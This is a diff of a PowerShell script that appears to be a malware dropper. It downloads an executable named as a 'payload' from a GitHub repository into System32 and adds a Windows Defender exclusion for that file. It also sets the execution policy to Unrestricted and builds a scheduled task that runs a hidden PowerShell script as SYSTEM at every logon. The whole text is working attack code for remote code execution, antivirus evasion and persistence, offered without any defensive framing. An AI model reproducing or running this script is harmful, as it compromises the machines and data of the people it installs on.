@@ -1,12 +1,13 @@
 # fetch payload from github
 Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
+Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
 # add exlusion to file
 Add-MpPreference -ExclusionPath "C:\Windows\System32\N0b0dy.exe"
 # set execution policy
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
 # add schedule to start exe
 # add variables for scheduler
-$action = New-ScheduledTaskAction -Execute 'C:\Windows\System32\N0b0dy.exe'
+$action = New-ScheduledTaskAction -Execute powershell.exe -Arguments "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File C:\Windows\System32\ddrcc.ps1"
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 # register scheduled task
